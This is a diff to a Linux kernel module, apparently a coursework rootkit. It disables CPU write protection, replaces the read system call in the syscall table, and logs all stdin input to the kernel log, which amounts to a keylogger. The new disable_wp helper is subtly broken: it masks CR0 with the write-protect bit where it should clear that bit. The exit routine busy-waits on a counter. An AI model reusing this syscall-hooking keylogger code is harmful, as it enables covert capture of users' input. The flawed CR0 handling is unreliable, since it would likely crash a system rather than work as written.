@@ -19,6 +19,7 @@
 #include <linux/syscalls.h>
 #include <linux/unistd.h>
 #include <linux/string.h>
+#include <linux/delay.h>
 #include "sysmap.h"
 
 #define DRIVER_AUTHOR "Nicolas Appel, Wenwen Chen"
@@ -27,6 +28,19 @@
 void ** syscall_table = (void * *) sys_call_table_R;
 ssize_t (*orig_sys_read)(int fd, void *buf, size_t count);
 char * buffer;
+int r_count=0;
+
+inline void disable_wp(void){
+	long cr0;
+	cr0 = read_cr0();
+	write_cr0(cr0 & 0x00010000);
+}
+
+inline void enable_wp(void){
+	long cr0;
+	cr0 = read_cr0();
+	write_cr0(cr0 | 0x00010000);
+}
 
 static void print_nr_procs2(void)
 {
@@ -50,6 +64,7 @@ static void print_nr_procs(void)
 static ssize_t my_read(int fd, void *buf, size_t count){
 	static int buf_size = 0;
 	ssize_t retVal;
+	r_count++;
 	retVal = orig_sys_read(fd, buf, count);
 	if(fd == 0){ //stdin
 		if(count >= buf_size){
@@ -62,52 +77,37 @@ static ssize_t my_read(int fd, void *buf, size_t count){
 			printk(KERN_INFO "%s\n",buffer);
 		}
 	}
+	r_count--;
 	return retVal;
 }
 
 
 static int __init mod_init(void)
 {
-  unsigned long addr;
-  int ret;
-  unsigned long cr0;
 
-
-  printk(KERN_INFO "Welcome!\n");
-  printk(KERN_INFO "Read address: %p", syscall_table[0]);
+  //printk(KERN_INFO "Welcome!\n");
+  //printk(KERN_INFO "Read address: %p\n", syscall_table[0]);
   
   //Disable write protection in the cpu
-  cr0 = read_cr0();
-  write_cr0(cr0 & ~0x00010000); //Bit 16 is the write protection bit
- 
-
-  addr = (unsigned long) syscall_table;
-  //Set the memory of addr's page and the next two pages as writable
-  ret = set_memory_rw(PAGE_ALIGN(addr) - PAGE_SIZE, 3);
-  if(ret){
-	printk(KERN_INFO "Cannot set memory to rw\n");
-  }
-  else{
-  	printk(KERN_INFO "Set memory to rw\n");
-  }
+  disable_wp(); 
 
   orig_sys_read = syscall_table[__NR_read];
   syscall_table[__NR_read] = my_read;
-
-  write_cr0(cr0);
-
+  
+  enable_wp();
+  
   return 0;
 }
 
 static void __exit mod_exit(void)
 {
-  unsigned long cr0;
-  cr0 = read_cr0();
-  write_cr0(cr0 & ~0x00010000);
+  disable_wp();
   syscall_table[__NR_read] = orig_sys_read;
-  set_memory_ro(PAGE_ALIGN((unsigned long) syscall_table) - PAGE_SIZE, 3);
-  write_cr0(cr0);
+  enable_wp();
   kfree(buffer);
+  while(r_count > 0){
+	printk(KERN_INFO "\n");
+  }  
   printk(KERN_INFO "Goodbye!\n");
 }
 
